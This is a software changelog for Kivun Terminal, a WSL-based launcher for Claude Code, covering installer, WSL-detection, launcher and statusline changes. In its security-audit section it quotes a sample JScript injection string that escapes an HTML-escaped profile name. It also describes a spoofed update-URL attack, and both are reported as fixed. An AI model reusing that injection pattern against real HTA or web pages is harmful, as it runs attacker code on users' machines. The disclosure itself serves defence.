# Changelog

All notable changes to Kivun Terminal are documented here.
Format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).

## [Unreleased]

### Documented — RTL cost optimizer measured: no token saving (follow-up to #98 / #102 / #84)

The v1.4.27 RTL cost optimizer experiment was measured with paired A/B
testing against real Claude calls (`claude -p --output-format json`,
reading actual `usage.output_tokens`) on **Opus 4.8** and **Sonnet 4.6**,
~110 calls total.

- **Result: no token saving — not even for Hebrew-reply users.** Across
  every configuration the net output-token effect was statistically
  indistinguishable from zero (e.g. Opus 4.8 with extended thinking at
  `--effort xhigh`: −0.5%, 95% CI [−5.8%, +4.8%]; pooled Opus 4.8: +1.9%,
  95% CI [−2.2%, +6.0%]). The English scaffold *adds* input tokens.
- **Why (structural):** a Hebrew answer costs ~31% more tokens than the
  same answer in English (measured), but that "tax" lives in the output
  tokenizer; the optimizer keeps replies in Hebrew (correctly), so it
  cannot reach it, and the "reason in English" lever doesn't move total
  tokens because Claude already reasons efficiently regardless of prompt
  language.
- Action: left **off by default**; docs updated from "savings unproven" to
  the measured "no benefit." Findings posted to PR #102 / #84. The lossless
  normalization and meaning-safety guarantees from #98 are unchanged.

## [1.4.30] - 2026-06-15

### Fixed — elevated WSL install no longer hangs on a hidden "create a user" window

The elevated WSL step ran `wsl --install` **without** `--no-launch`. Bare
`wsl --install` installs WSL and then *launches* Ubuntu, which opens an
interactive **"Create a default Unix user account:"** prompt in the elevated
console. `ExecShellWait` waits for that process to exit, but it sits on the
prompt forever waiting for keyboard input, so the installer appeared **frozen
with a progress bar that never moved**, and nothing told the user that a
separate window needed their input (or to close it). A real user got stuck
here past 15 minutes.

- `installer/Kivun_Terminal_Setup.nsi` now elevates `wsl --install --no-launch`,
  so WSL + Ubuntu install **without** the interactive prompt. The non-root
  user is created non-interactively afterward by `kivun-ensure-user.sh` (as it
  already was on the normal path). No blocking window, nothing to close.

## [1.4.29] - 2026-06-15

### Changed — install progress now tells users how long it takes and not to close

During the long phase that installs Ubuntu packages, Konsole and Claude
Code inside WSL, the installer showed only the generic "Please wait while
Kivun Terminal is being installed" with a moving bar and no time estimate.
A real user, mid-install, did not know whether to keep waiting or close the
window. (Per-step hints like "~30-60 seconds" and "3-8 minutes" were already
in the detail log, but there was no upfront total.)

- `installer/Kivun_Terminal_Setup.nsi` now prints a clear banner at the start
  of the Konsole/Claude phase: it takes about **5 to 15 minutes**, a moving
  bar means it is working, **leave the window open**, and it is finished only
  when a **Finish** button appears and the title changes to "Installation
  Complete". Follows the v1.4.28 effort to make the installer self-explanatory.

## [1.4.28] - 2026-06-15

### Changed — "WSL install not started" now tells users exactly what to do (Run as administrator)

When the elevated `wsl --install` step fails to start, the installer used to
say only "WSL install not started" and jump straight to "open Terminal as
Administrator and run wsl --install". On a real machine this caused a support
round-trip: the user was already on the `Sysnative`-fixed path (so it was not
the old WOW64 bug), the separate UAC prompt had silently failed (no window
appeared), and the fix turned out to be simply re-running the installer itself
as administrator.

- The failure dialog (`installer/Kivun_Terminal_Setup.nsi`) now leads with the
  proven fix: **close the window, right-click the installer, choose "Run as
  administrator", run it again.** That completes the WSL install in one go on a
  machine where the user has admin rights.
- It then explains the two remaining cases plainly: if "Run as administrator"
  asks for a password the user does not have, it is a locked-down work PC and
  IT must run `wsl --install` once; if antivirus blocks the download, use the
  bundled offline `offline-install.cmd`.
- The Cancel-path message ("install WSL yourself later") got the same
  Run-as-administrator hint as its easiest option, for consistency.
- No flow change, message text only. The diagnostic log path is unchanged.

## [1.4.27] - 2026-06-11

### Added — RTL cost optimizer experiment, rebuilt correctly (closes #98; continues PR #84 by @zuwasi)

An **off-by-default experiment** that rewrites PIPED Hebrew/Arabic prompts
before they reach Claude Code: strips niqqud/diacritics and invisible
direction marks, collapses whitespace (fenced code untouched), and wraps
the **full request verbatim** in a short English reasoning frame.

- Fixes both #84 correctness blockers by construction: there is no TUI
  optimizer (interactive typing is never touched — piped stdin only), and
  there are no intent templates (nothing can substitute or truncate the
  user's request; a regression test pins the exact "remove CMake" case #84
  inverted).
- The default stdin path is byte-identical to previous releases — the
  optimizer module is not even loaded unless `KIVUN_RTL_COST_OPTIMIZER=on`.
- Honest accounting: the stderr estimate can go NEGATIVE (the scaffold adds
  input tokens); docs say plainly that savings are unproven and the
  experiment measures output-token impact. Per-prompt metrics (never prompt
  text) append to `~/.local/state/kivun-terminal/rtl-cost-optimizer.jsonl`.
- Knobs documented in `config.txt`; propagated on both Windows and Linux.

## [1.4.26] - 2026-06-10

### Added — native launcher: no more black window flash (continuation of PR #83 by @zuwasi)

Double-clicking Kivun Terminal used to flash a black cmd window (minimized,
but visible) and leave a minimized console on the taskbar for the whole
session. Both are gone.

- New **`launcher/`** builds **`KivunTerminal.exe`** — a ~150 KB native
  launcher that runs `kivun-terminal.bat` in a console with **no window at
  all** (`CREATE_NO_WINDOW`). It is a deliberately thin shell: every check
  the launcher performs (config, folder picker, WSL health, Claude
  auto-install, root guard, WSLENV) stays in the battle-tested `.bat`.
- The desktop shortcut, Start-menu shortcut, Explorer right-click entries,
  and the installer's "Launch now" checkbox now target the exe. Konsole is
  the only window the user ever sees.
- **Failures stay visible**: the exe waits for the bat's exit code and pops
  a MessageBox with the last lines of `LAUNCH_LOG.txt` when it is non-zero —
  no silent-failure regression (the v1.1.0 lesson).
- The bat gained `KIVUN_HIDDEN` guards: interactive prompts are skipped with
  safe defaults, and the WSL bridge launches via `start /B` so no taskbar
  console appears. Launched directly (visible console), behavior is
  byte-identical to before.
- New Start-menu shortcut **"Kivun Terminal (console)"** runs the same bat
  with a visible console — diagnostics aid and the fallback if an antivirus
  ever quarantines the unsigned exe.
- CI builds the exe (vswhere → MSVC, any edition) before packaging, and a
  new `validate-launcher-windows` job drives the exe → hidden-bat chain
  against real WSL, asserting env propagation, spaced-path argument
  forwarding, and exit-code propagation.

## [1.4.25] - 2026-06-10

### Added — offline / antivirus-safe WSL+Ubuntu install path (for locked-down PCs)

Some corporate antivirus (we confirmed **McAfee Web Protection** on a real PC) blocks
the large WSL download that Microsoft's `wsl --install` performs — so the normal
install can't complete. There's now a fallback that needs **no downloads at all**.

- New **`offline/offline-install.cmd`** installs WSL2 + Ubuntu from two official local
  files using only native, Microsoft-signed tooling — `dism` to enable the features,
  `msiexec` for the signed WSL runtime MSI, and `wsl --install --from-file` for the
  Ubuntu image. No PowerShell, no Microsoft Store, no downloads during install, so
  antivirus has nothing to block. It checks firmware virtualization first and resumes
  across the reboot WSL needs.
- The two files come straight from the vendors — the WSL MSI from
  <https://github.com/microsoft/WSL/releases> and the Ubuntu 24.04 image from
  <https://releases.ubuntu.com/noble/> — documented in **`offline/README.md`**.
- The installer now **bundles `offline-install.cmd`** (in Core, so it survives an
  aborted WSL step), and its "WSL/Ubuntu install failed" messages **point to it**
  instead of dead-ending — so a user whose antivirus blocked the download has a clear,
  reliable next step.

## [1.4.24] - 2026-06-10

### Fixed — keyboard opens in your current language; Alt+Shift switching is reliable

The terminal used to always start on the Hebrew (primary RTL) keyboard, and the
`setxkbmap` toggle was applied *before* the Konsole window had focus — so on WSLg
the very first **Alt+Shift** could be missed and it felt "stuck on Hebrew".

- Kivun now **opens in the language you're currently using**: it reads the active
  layout WSLg forwards from Windows (`setxkbmap -query`) and puts that group first
  (English-first if it can't tell), so the terminal is immediately ready for the
  language you're on. Both English and your RTL layout stay one **Alt+Shift** apart.
- The layout + Alt+Shift toggle are **re-applied the moment the Konsole window
  appears/gets focus**, so the first keystroke registers — no more dead first press.
- Dropped the misleading `Keyboard mode: WSLg (Alt+Shift may not work)` message and
  corrected the troubleshooting docs (WSLg handles Alt+Shift on modern Windows 11;
  VcXsrv is only a rare fallback).

## [1.4.23] - 2026-06-10

### Fixed — terminal window never opened on the newest Ubuntu (Qt6 Konsole dropped --name)

On a PC that pulled a brand-new Ubuntu (the `resolute` archive — Qt6 Konsole
under Wayland), the launcher's `konsole --name kivun-terminal …` aborted with
`Unknown option 'name'`, so the window closed instantly and Claude never
appeared — even though WSL, Ubuntu, the user, Claude and Konsole were all fine.
The bash log showed it plainly: `konsole: Unknown option 'name'.`

- `payload/kivun-launch.sh` now **probes once** whether this Konsole accepts
  `--name` and only passes it when it does — in both the live launch and the
  `.desktop` Exec. On Qt6/Wayland it launches without `--name`, losing only the
  custom WM_CLASS (taskbar icon grouping) while the window opens normally. On
  older (Qt5) Konsole nothing changes.

## [1.4.22] - 2026-06-10

### Fixed — Ubuntu had no non-root user, so Claude (which won't run as root) couldn't launch

A real PC reached the very end — virtualization on, WSL + Ubuntu installed,
Claude downloaded fine *inside* WSL (confirming antivirus does **not** block
WSL2-internal downloads) — then dead-ended: Ubuntu installed via
`wsl --install --no-launch` contains **only root**, and Claude Code refuses to
run as root. The launcher could only print `adduser` commands for the user to
type by hand (which this project's "never tell users to run cmd" rule forbids).

Now a non-root user is created **automatically**:

- New `payload/kivun-ensure-user.sh` (idempotent): creates user `kivun`, gives
  it passwordless sudo, and sets it as the WSL default via `/etc/wsl.conf`. Both
  the installer and launcher run it by piping it in (`type … | wsl --user root
  -- bash -s`), which dodges all NSIS/cmd/bash quoting of the sudoers parens
  (the `.sh` is LF via `.gitattributes`).
- `installer/Kivun_Terminal_Setup.nsi` (SEC_WSL) runs it right after Ubuntu
  installs and restarts the distro, so WSLg is owned by `kivun` and Claude
  installs into the user's home (not `/root`).
- `payload/kivun-terminal.bat` now **auto-creates** the user when it finds none
  (replacing the old manual-command dialog) and continues; if it still can't, it
  points the user at Kivun Diagnostics instead of cmd instructions.

## [1.4.21] - 2026-06-10

### Added — bundled "Kivun Diagnostics" report tool + clear test/report instructions

Users who hit a problem had no easy way to capture diagnostics or to know how to
report back — only the private on-site kit did. Now every install ships a
one-click report tool and tells users how to test and where to send a report.

- New `payload/kivun-diagnostics.cmd`, installed in the **Core** section (so it
  exists even if a later section aborts — e.g. virtualization off) with a
  **"Kivun Diagnostics"** Start Menu shortcut. One click writes
  `Kivun-Report.txt` to the Desktop (Kivun + Windows version, the virtualization
  verdict, WSL status/version/distros, antivirus present, in-WSL claude/node, and
  the install log), opens it in Notepad, and tells the user to **email it to
  noambbb@gmail.com** (or attach it to a GitHub issue). No admin, no PowerShell,
  no downloads; nothing is sent automatically.
- The Finish page now explains how to **test** (launch Kivun, message Claude) and
  how to report; the virtualization-off and Claude-install-failed dialogs both
  point at Kivun Diagnostics + the contact.
- Uninstaller removes the tool and its shortcut. `FALLBACK_VERSION` and all
  version stamps bumped to 1.4.21.

### Note — the installer is intentionally small

`Kivun_Terminal_Setup.exe` (~370 KB) is a *launcher*: it sets up WSL, Ubuntu,
Konsole and Claude at runtime rather than bundling them. A fully-offline build
that carries WSL + Ubuntu is a separate, still-pending option, gated on the
"do downloads work inside WSL" test.

## [1.4.20] - 2026-06-09

### Changed — clearer, per-manufacturer BIOS steps in the virtualization help

The "turn on virtualization" dialog (added in 1.4.19) now lists the BIOS/Setup
key **by PC maker** instead of a generic "often F2/F10/Del/Esc", so users don't
have to guess:

- Dell / ASUS / Acer → **F2**
- Lenovo → **F1, F2, or the Novo button**
- HP → **Esc, then F10**
- Other / desktops → **Del (or F2)**

Mirrored in the on-site test kit (`diagnose.cmd` `[2b]` verdict,
`offline-install.cmd` `[0/4]` gate, `OFFLINE-INSTALL.md` STEP 0).

### Fixed — stale fallback version in the folder picker

`payload/folder-picker.hta`'s `FALLBACK_VERSION` was still `1.4.10` (used only
when the installed `VERSION` file is missing, so it never affected normal
installs). Bumped to 1.4.20 in lockstep with `VERSION`, and the release
consistency sweep now covers `.hta` too.

## [1.4.19] - 2026-06-09

### Added — clear "turn on virtualization" guidance instead of a silent reboot loop

A real user PC (Windows 10 Home, a 2018 Lenovo) had **hardware virtualization
disabled in firmware** — `systeminfo` showed `Virtualization Enabled In
Firmware: No`. WSL2 runs Linux inside a lightweight Hyper-V utility VM, which
**cannot start** without that firmware switch. So `wsl --install` succeeded and
asked for a reboot, but every distro boot afterward failed — and the installer
could only keep asking to reboot and re-run. The user had no way to learn the
real cause.

No software (this installer included) is permitted to flip the firmware
virtualization switch — only the user can, in BIOS/UEFI setup. So the installer
now **detects this up front and explains exactly what to do**, in plain
language, instead of looping:

- New pre-flight in `installer/Kivun_Terminal_Setup.nsi` (`CheckVirtualization`)
  runs before any WSL work. Detection is **locale-independent**: it decides
  purely from `findstr` exit codes on `wmic`'s non-localized TRUE/FALSE output
  (`Win32_Processor.VirtualizationFirmwareEnabled` and
  `Win32_ComputerSystem.HypervisorPresent`) — never parsing localized text, and
  never parsing wsl.exe's UTF-16 output (which `findstr` can't read). It blocks
  only when firmware VT is explicitly FALSE **and** no hypervisor is already
  running (a running hypervisor means VT is actually on). Machines where `wmic`
  is absent (some Win11 24H2+) simply proceed rather than being false-blocked.
- When VT is off, `ShowVirtualizationHelp` shows a clear dialog: restart →
  Setup/BIOS key → enable "Virtualization" / "Intel VT-x" / "SVM Mode" → save →
  re-run. The installer then stops cleanly instead of looping.

### Fixed — installer UI displayed the wrong version

`PRODUCT_VERSION` in the NSI was pinned at `1.4.15` while `VERSION` (the release
source of truth) had advanced, so recent releases' welcome/finish pages and the
Add/Remove Programs entry showed **v1.4.15**. The build does not inject the
version, so the NSI version strings (and the docs' title stamps) are now bumped
in lockstep with `VERSION` (1.4.19).

## [1.4.18] - 2026-06-09

### Fixed — endless WSL reinstall/reboot loop (detection probe couldn't see the WSL it just installed)

v1.4.17 fixed the elevated `wsl --install` (via Sysnative), so WSL now installs.
But after the reboot the installer **reinstalled WSL and asked to reboot again,
forever**. The real-PC log was conclusive — `wsl --version exit=error` on *every*
run, including right after a successful install + reboot:

```
Elevated wsl --install finished; reboot required
=== install started ===            (after reboot)
wsl --version exit=error           ← never sees the WSL it just installed
WSL not available -> offering elevated wsl --install   ← loops
```

Root cause: the **detection probe** still used bare `wsl`, which (like the
install step before v1.4.17) can't be launched from the 32-bit installer due to
WOW64 redirection — so it returned `exit=error` regardless of whether WSL was
installed, and the installer concluded "missing" on every launch.

- `installer/Kivun_Terminal_Setup.nsi` now runs the detection probe through the
  same **`$WINDIR\Sysnative\wsl.exe`** path the install step uses (falling back
  to `System32` on 32-bit Windows). It treats WSL as present if **either**
  `wsl --status` or `wsl --version` exits 0, so a freshly installed WSL — or any
  WSL build that exposes only one of those subcommands — is detected correctly
  and the loop is broken. Both subcommands are non-interactive, so a PC without
  WSL still returns promptly instead of hanging on the bare-`wsl` install prompt.

## [1.4.17] - 2026-06-08

### Fixed — automatic WSL install "did not start" on PCs without WSL (32-bit installer couldn't launch wsl.exe)

On a clean PC that did not have WSL, the installer correctly detected WSL was
missing, offered to install it, but then the elevated `wsl --install` **"did not
start"** — even when the user ran the installer as Administrator. A real-PC log
showed it wasn't a permissions or policy problem at all:

```
wsl --version exit=error          (empty output — the process never launched)
Elevated wsl --install did not start (UAC declined or blocked by policy)
```

Root cause: the installer is **32-bit**, so `"$WINDIR\System32\wsl.exe"` is
subject to **WOW64 file redirection** → `SysWOW64\wsl.exe`, which doesn't exist.
(An old comment claimed wsl.exe was excluded from redirection; the log proves it
isn't.) So `ShellExecuteEx` had nothing to launch and silently failed — running
as admin couldn't help because it was a path problem, not a privilege one. The
user's own 64-bit terminal reaches `wsl.exe` fine.

- `installer/Kivun_Terminal_Setup.nsi` now launches the elevated `wsl --install`
  via the **`Sysnative`** alias (`$WINDIR\Sysnative\wsl.exe`), the documented way
  for a 32-bit process to reach the real 64-bit System32 binary, falling back to
  `System32` on 32-bit Windows. So one-click WSL install actually starts. The
  detection probe is unchanged (it already reaches WSL correctly once installed,
  via the WindowsApps execution alias).

## [1.4.16] - 2026-06-08

### Fixed — Claude install no longer drops to a "run this by hand" dialog on a transient blip

The Claude Code install (both the installer's step and the launcher's runtime
install) fetched Anthropic's `install.sh` with a bare `curl -fsSL` and **no
retry**. A single transient network hiccup made it fail straight through to the
MessageBox that tells the user to run the install command manually in WSL — which
read like a "policy denied the install" block even though it was just our own
fallback dialog.

- `installer/Kivun_Terminal_Setup.nsi` and `payload/kivun-install-claude.sh` now
  fetch `install.sh` with `curl --retry 5 --retry-all-errors --retry-delay 2
  --connect-timeout 30`, so transient failures auto-recover instead of surfacing
  the manual-command dialog. (This is the WSL/Linux counterpart of the curl
  resilience added to the Windows Launchpad CLI; the schannel `close_notify`
  issue does not apply here because WSL's curl uses OpenSSL.)
- The remaining last-resort MessageBox now leads with "this is usually temporary —
  click OK and re-run," so users are no longer told to run a command by hand as
  the first response to a blip.

## [1.4.15] - 2026-06-03

### Fixed — "WSL not installed" abort left no log and used a fragile probe

A customer's install aborted at the WSL check with no evidence on disk. The
verdict (WSL genuinely not installed — only the legacy `wsl.exe` stub present)
was correct, but the installer was neither diagnosable nor as helpful as it
could be.

- **Install logging (new).** The installer now writes
  `%LOCALAPPDATA%\Kivun-WSL\install-log.txt`, created in `.onInit` *before* any
  section can abort, so a WSL-detection failure always leaves a Windows-side log
  (previously the only logs were inside WSL at `/tmp/kivun-*.log`, which don't
  exist until WSL works). Mirrors the launcher's existing logging.
- **Reliable WSL probe.** Replaced `wsl --status` with
  `cmd /c wsl --version < nul` (the verb + `< nul` stdin guard the launcher
  already trusts — `payload/kivun-terminal.bat`), and captures the exit code and
  output to the log. On a legacy WSL stub this records the usage text instead of
  silently discarding it.
- **Installs WSL for the user (was: told them to do it manually).** When WSL is
  missing the installer now offers (info dialog, OK/Cancel) to install it, and
  on OK runs Microsoft's built-in `wsl --install` itself. Installing WSL
  unavoidably needs admin + a reboot, so we keep the installer per-user and
  elevate **only** the signed Microsoft `wsl.exe` via a single UAC prompt — no
  PowerShell, no cmd wrapper, no elevating the whole installer (so $LOCALAPPDATA
  / HKCU writes stay correct per SECURITY #10). After it finishes the user
  reboots and re-runs to complete Ubuntu/Konsole/Claude. The real 64-bit
  `wsl.exe` is resolved via `$WINDIR\Sysnative` (NSIS is a 32-bit process).
- **Graceful fallbacks.** If the user cancels, or the UAC prompt is declined /
  blocked by org policy (`ExecShellWait` errors), the installer shows clear
  manual steps and the log path instead of pretending — never a silent failure.
- `RequestExecutionLevel user` is unchanged; only `wsl.exe` elevates.

### Changed — version bump

- `VERSION`, `installer/Kivun_Terminal_Setup.nsi`
  (`PRODUCT_VERSION`/`VIProductVersion`/`FileVersion`), `README.md` badge, and
  the `docs/` headers — 1.4.14 → 1.4.15.

## [1.4.14] - 2026-05-27

### Fixed — picker always opens with Opus as the default model

The Default profile now never persists the model selection. Previously, if a
user launched with Sonnet, the Default profile saved `model: "sonnet"` and the
picker would silently open on Sonnet next time — even though the user never
asked for Sonnet to be the permanent default.

- `captureDialogToProfile`: when saving the Default profile, always writes
  `"opus"` for the model field regardless of what was selected at Launch time.
- `applyProfileToDialog`: when loading the Default profile, always sets the
  model radio to Opus regardless of what is stored.
- Named project profiles are unaffected and continue to remember their own
  model as an explicit per-project choice.
- Applied to `payload/folder-picker.hta`.

### Changed — version bump

- `VERSION` — 1.4.13 → 1.4.14.
- `installer/Kivun_Terminal_Setup.nsi` — `PRODUCT_VERSION` / `VIProductVersion`
  / `FileVersion` → 1.4.14 / 1.4.14.0.
- `docs/README.md`, `docs/README_INSTALLATION.md`, `docs/CREDENTIALS.txt`,
  `docs/SECURITY.txt`, `docs/TROUBLESHOOTING.md` — version header bumps.
- `README.md` — badge cachebust → `cb=v1.4.14`.

## [1.4.13] - 2026-05-26

### Changed — a second launch now opens a new TAB instead of closing the open window

Launching Kivun while a Kivun Konsole was already open **killed the existing
window without warning** and opened a fresh one, so you couldn't work on two
projects at once. The culprit was a `pkill -x -u <uid> konsole` in
`payload/kivun-launch.sh` meant to clear *zombie* windows from failed launches
that also closed live sessions.

Now, when a Kivun window is already open, a new launch **adds a tab to it**
(opening in the folder you picked) and leaves your existing session untouched.

- **Removed the `pkill`.** Existing windows are never closed.
- **Managed per-user D-Bus session bus.** WSLg provides no session bus, so the
  launcher starts a tiny reusable one (`dbus-daemon`, already on Ubuntu) at
  `$XDG_RUNTIME_DIR/kivun-bus` and persists its address, so each launch — a
  separate `wsl` invocation — can find the running Konsole.
- **Tabs via Konsole's D-Bus API.** `konsole --new-tab` does not reliably
  attach to a running instance under WSLg (it falls back to a new window), so
  the launcher calls `org.kde.konsole.Window.newSession(profile, directory)`
  to create the tab in the chosen folder, then `Session.runCommand` to start
  Claude in it. Verified on Konsole 23.08.5 / WSLg.
- **Safe fallback.** If no reachable Konsole is found (e.g. first launch, or a
  window started by an older version), it opens a normal new window — still
  never closing anything.
- **New `KIVUN_TABBED` config toggle** (default `on`). Set `KIVUN_TABBED=off`
  in `config.txt` for a separate window per launch.
- **Tabs are named by project.** The Konsole profile's tab title changed from a
  static `Kivun Terminal` to `%d` (current-directory basename), so each tab/window
  shows its project folder (e.g. `gvSIG`) instead of all reading "Kivun Terminal".
- **Tab profile fix.** Konsole's D-Bus `newSession` matches the profile *Name*
  (`Kivun Terminal`), not the filename (`KivunTerminal`) the CLI `--profile` uses;
  passing the filename silently fell back to the black Built-in scheme, so tabs
  opened black. Now passes the Name and tabs get the light-blue Kivun theme.

## [1.4.12] - 2026-05-24

### Fixed — native Linux Claude no longer skipped when a Windows Claude is on PATH

WSL appends the Windows PATH, so a user who has Claude installed on Windows (npm: `/mnt/c/Users/<name>/AppData/Roaming/npm/claude`) had that binary show up in `command -v claude` inside Ubuntu. Both the installer and the launcher treated that as "Claude is installed" and **skipped installing the native Linux Claude** — after which the launcher drove the Windows binary through WSL. That can open Konsole but fail to render the interactive TUI (terminal opens, Claude never appears). Reported on a real machine where Claude resolved to the Windows npm path.

Aligned all three Claude-detection sites to **native-only** (reject `/mnt/*`), matching what `kivun-claude-bidi/lib/resolve-claude-bin.js` already does:

- **`installer/Kivun_Terminal_Setup.nsi` (`SEC_CLAUDE`) detection** — `command -v claude` → `command -v claude | grep -q -v ^/mnt/`. A Windows-only Claude no longer counts; native install proceeds.
- **`installer/Kivun_Terminal_Setup.nsi` (`SEC_CLAUDE`) install** — dropped `-u root`. The official installer writes to `$HOME/.local/bin`; as root that was `/root/.local/bin`, unusable by the normal launcher user. Now runs as the default user (matching the launcher's own runtime install), landing Claude in a slot the resolver checks. The npm fallback still installs system-wide.
- **`payload/kivun-terminal.bat` presence gate** — the login-shell fallback `command -v claude` likewise now rejects `/mnt/*`, so the runtime safety-net install isn't skipped by a Windows Claude.

No behavior change for users who already have a native Linux Claude (`~/.local/bin`, `/usr/local/bin`, `/usr/bin`) — those are detected first, exactly as before.

## [1.4.11] - 2026-05-24

### Fixed — desktop shortcut + right-click no longer lost on a partial install

A user on a fresh install reported the desktop icon appeared but the "Open with Kivun Terminal" folder right-click menu did not. Two root causes in `installer/Kivun_Terminal_Setup.nsi`:

- **Section ordering.** `SEC_SHORTCUT` and `SEC_RCLICK` ran *last*, after the `SEC_WSL` / `SEC_KONSOLE` (~300 MB Konsole download) / `SEC_CLAUDE` sections. Any `Abort` in those (apt failure, user clicks Cancel, no internet) stopped the whole install before the shortcut/right-click sections ever ran. Moved both to run **immediately after `SEC_CORE`** and before the failure-prone sections. They only touch local files (already written by Core) and HKCU, so they can't fail.
- **Right-click was opt-in.** `SEC_RCLICK` was marked `/o` (unchecked by default), so users who didn't tick it on the components page never got the context menu the welcome page advertises as a headline feature. Now **default-on**.

### Fixed — installer version label stuck at 1.2.4

`PRODUCT_VERSION` was hardcoded `"1.2.4"` in the `.nsi` while `VERSION` had advanced to 1.4.10. CI builds with `makensis` and does **not** inject the version, so every release since 1.2.4 shipped an installer that labeled itself "Kivun Terminal v1.2.4" (welcome page, Add/Remove Programs, finish page). Synced `PRODUCT_VERSION`, `VIProductVersion`, and `FileVersion` to the real version, and bumped the current-version header stamps in `docs/` (CREDENTIALS, SECURITY, README, README_INSTALLATION, TROUBLESHOOTING).

### Changed — finish-page checkboxes default to unchecked

"Launch Kivun Terminal now" and "View Quick Start Guide" on the finish page are now **unchecked by default** (`MUI_FINISHPAGE_RUN_NOTCHECKED`, `MUI_FINISHPAGE_SHOWREADME_NOTCHECKED`). Clicking Finish no longer auto-launches anything unless the user opts in. The right-click integration is deliberately *not* among the defaulted-off options — only genuinely-optional convenience actions are unchecked.

### Note — coexistence with the sister ClaudeCode Launchpad CLI

Separately fixed in the sister repo `noambrand/kivun-terminal` (not part of this tag): its installer was deleting *this* product's `Kivun Terminal.lnk` desktop shortcut and `KivunTerminal` right-click registry keys as "legacy cleanup," wiping them whenever it ran. With that removed, both products now coexist — distinct install dirs (`Kivun-WSL` vs `Kivun`), ARP keys, and context-menu namespaces.

## [1.4.10] - 2026-05-18

### Added — statusline reasoning-effort field + opt-in extras

The bottom-of-session statusline (`payload/statusline.mjs`, internal version bumped v2.1 → v2.2) now surfaces the reasoning effort level (low/medium/high/max) that Claude Code 2.1.x supports via `/effort`. Inspired by [jftuga/claude-statusline](https://github.com/jftuga/claude-statusline), which also exposes session cost, cache tokens, and tokens/minute — those land here as **opt-in** fields so the bar stays clean for users who don't want them.

#### `payload/statusline.mjs`

- **New default field `effort:<level>` on line 1**, magenta, placed right after the model name. Three-tier resolution chain in `readEffort()`:
  1. `d.effort.level` from the JSON Claude Code pipes to the statusline. Forward-compat for [anthropics/claude-code#40261](https://github.com/anthropics/claude-code/issues/40261) (request to expose effort on the statusline payload) — still open as of 2026-05, also tracked under #38476, #31415, #27747.
  2. `CLAUDE_CODE_EFFORT_LEVEL` env var. Useful as an explicit override per shell.
  3. `effortLevel` key from `~/.claude/settings.json`. Picks up the user's saved default. **Known gap:** stale on mid-session `/effort` overrides — Claude Code doesn't rewrite `settings.json` when the user toggles effort during a session, so the statusline will show whatever was set at startup. Upstream limitation; no workaround until Anthropic ships #40261.

  If none of the three resolve, the field is hidden (cleaner than rendering a misleading `auto` placeholder).

- **Three opt-in fields, off by default** — each gated by a single env var matched by `truthy()` (`1`/`true`/`yes`/`on`):
  - `KIVUN_SL_COST=1` — renders `$X.XX` from `d.cost.total_cost_usd` in green.
  - `KIVUN_SL_CACHE=1` — renders `cache:<N>` (sum of `cache_read_input_tokens` + `cache_creation_input_tokens`, formatted as M/K/raw) in blue.
  - `KIVUN_SL_TPM=1` — renders `tpm:<output_tokens_per_minute>` in cyan, suppressed when session duration is under 5 s to avoid noisy short bursts.
- **No installer changes.** Env vars beat `config.txt` keys here because adding `STATUSLINE_*` to `config.txt` would have meant touching `kivun-launch.sh`, `install.sh`, `mac/_archive/scripts/postinstall`, `installer/Kivun_Terminal_Setup.nsi`, and three READMEs. Env vars require touching zero of those — `export KIVUN_SL_COST=1` in `.bashrc` and the field appears. Trade-off: less discoverable than a commented-out line in `config.txt`; documented in `docs/TROUBLESHOOTING.md` to compensate.
- **Imports added:** `fs`, `path`, `os` (needed for the `settings.json` fallback read). First time the file has imports — it was previously pure-stdin with no Node built-ins.

#### Verification before tag

Smoke-tested on Windows with Node 24.12.0:
- Test 1 (baseline, no env, no JSON effort) → falls back to `effortLevel` in `~/.claude/settings.json` (this machine had `"xhigh"`), correctly rendered `effort:xhigh`. Confirms the settings.json branch.
- Test 2 (`effort.level: "high"` in JSON) → renders `effort:high`, JSON branch wins as designed.
- Test 3 (`CLAUDE_CODE_EFFORT_LEVEL=medium`, no JSON effort) → renders `effort:medium`, env beats settings.json.
- Test 5 (all three opt-in env vars set) → `cache:2K` blue, `tpm:2000` cyan, `$0.12` green all rendered on line 1.
- Test 6 (malformed stdin) → existing `statusline: parse error` handler unchanged.

#### Out of scope

- No changes to `config.txt`, `kivun-launch.sh`, `install.sh`, `postinstall`, `installer/Kivun_Terminal_Setup.nsi`. Same statusline change also ships in the sister repo `noambrand/kivun-terminal` (ClaudeCode Launchpad CLI v2.6.5) — released same day.

## [1.4.9] - 2026-05-08

### Security fixes from internal audit

A security audit of the v1.4.8 codebase surfaced two HIGH-severity issues in the picker (both reachable via a malicious `profiles.json`) plus one MEDIUM in the BiDi wrapper. All fixed in this release.

#### Fixed (HIGH)

- **`payload/folder-picker.hta` — JScript injection via profile chip onclick (audit #2).** v1.4.1–v1.4.8's `populateProfileChips()` HTML-escaped profile names with `&#39;` for the single quote, then interpolated them into `onclick="switchToProfile('NAME')"`. IE/HTA HTML-decodes attributes **before** evaluating the JS, so `&#39;` becomes `'` again and a profile name like `x'); evil(); //` survives the escape and runs as JScript with full ActiveX privileges. Fixed by passing a profile **index** (a literal integer, no interpolation risk) and looking up the name from trusted state inside a new `switchToProfileByIndex()` handler.
- **`payload/folder-picker.hta` — `WshShell.Run` trusted attacker-controllable URL in update banner (audit #3).** v1.4.6's update-check feature interpolated GitHub's `browser_download_url` into `onclick="openUpdateUrl('URL')"`. Two layers of risk: (a) `escapeHtml` did not escape `'` (only `<`, `>`, `&`, `"`), so a hostile JSON response with `'` in the URL could break out of the JS string; (b) under a corp-MITM root CA, the JSON itself can be rewritten to point `browser_download_url` at any URL and ride the user's click into arbitrary download/run. Fixed two ways: (1) URLs are now stashed in module-scope `__pendingReleaseUrl`/`__pendingDownloadUrl` and the click handlers (`openLatestRelease()`, `openLatestDownload()`) read them from there — no string interpolation; (2) new `isTrustedUpdateUrl()` allowlists the URL prefix to `https://github.com/noambrand/kivun-terminal-wsl/`, `https://api.github.com/repos/noambrand/kivun-terminal-wsl/`, and `https://objects.githubusercontent.com/` (GitHub's release-asset CDN); anything else is silently rejected.

#### Fixed (MEDIUM)

